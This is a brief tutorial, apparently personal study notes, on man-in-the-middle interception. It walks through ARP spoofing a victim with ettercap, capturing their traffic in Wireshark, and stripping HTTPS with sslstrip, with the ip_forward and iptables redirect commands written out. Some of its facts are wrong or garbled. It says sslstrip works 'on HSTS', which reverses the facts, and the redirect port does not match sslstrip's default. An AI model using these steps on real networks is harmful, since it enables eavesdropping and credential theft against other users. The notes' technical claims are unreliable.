Man in the Middle attack 



▪ This attack can be performed by etterap or bettercap
▪ You can use wireshark with ettercap to analyze the packets of the victims while they are entrening http sites
 
  Lets use ettercap
  
- # ettercap –G
- Choose network card (wlan0 or eth0)
- Go to Hosts and then scan for hosts
- Observe all hosts in the same network , go to hosts list - Put router Ip in target1 and the victim in taget2
- Choose arp spoofing
- Open wireshark and choose the same network card






▪ But wait , what if it was https

  Man in the Middle attack in https:

▪ When https , we use sslstrip with ettercap to downgrade https to http to be able to analyze the packets
▪ But sslstrip can only work on HSTS and old ssl certificate but in TLS certificate there is no way to downgrade the request till now 08.2024

 To downgrade https to http then use sslstrip
# echo "1" > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A PREROUTING -p tcp --destination- port 80 -j REDIRECT --to-port 1000
# sslstrip
 But it won't work cause of new version of TLS
